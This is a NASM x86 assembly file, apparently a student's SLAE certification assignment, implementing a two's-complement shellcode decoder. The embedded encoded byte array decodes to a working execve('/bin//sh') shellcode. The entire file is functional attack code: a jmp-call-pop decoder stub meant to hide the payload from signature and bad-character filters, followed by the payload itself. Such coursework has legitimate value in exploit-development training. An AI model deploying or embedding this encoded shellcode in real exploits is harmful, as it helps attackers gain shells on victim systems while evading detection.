; Filename:   two_complement_decoder.nasm
; Author:     Samuel Dugo
; SLAE-ID:    SLAE-1376
; Size:       58 bytes (33 bytes for decoder + 25 bytes for payload)
; Purpose:    Assignment #4 of SLAE certification. This shellcode decodes an encoded shellcode using the two's complement method.

global _start			

section .text
_start:
	jmp short call_shellcode

load_and_clean:
        pop esi                      ;loads EncodedShellcode on esi
        lea edi, [esi]	              ;saves a pointer of start of EncodedShellcode on edi for going through the shellcode
        xor eax, eax	              ;cleans eax register
	cdq		              ;cleans edx register

decode:
        mov dl, byte [esi + eax]     ;loads on dl the byte to be decoded
	cmp dl,0xdd                  ;checks if the byte is the terminator byte defined
        jz short EncodedShellcode    ;if so, the shellcode has been decoded and program can execute the payload
	neg dl			      ;reverses the two's complementary method
        mov byte [edi], dl	      ;substitutes the encoded byte with the decoded byte on EncodedShellcode
        inc edi		      ;increments the pointer to the next byte to be substituted
	inc eax                      ;increments the counter to allow to load the next byte on dl
        mov dl, byte [esi + eax]     ;loads the next byte on dl
        jmp decode                   ;decodes next byte

call_shellcode:

	call load_and_clean ;load the payload on esp using jmp-call-pop technique
	;very important, including the terminator character (0xdd) at the end of EncodedShellcode and avoiding the use of this character on the EncodedShellcode
	EncodedShellcode: db 0xcf,0x40,0xb0,0x98,0xd1,0xd1,0x8d,0x98,0x98,0xd1,0x9e,0x97,0x92,0x77,0x1d,0xb0,0x77,0x1e,0xad,0x77,0x1f,0x50,0xf5,0x33,0x80,0xdd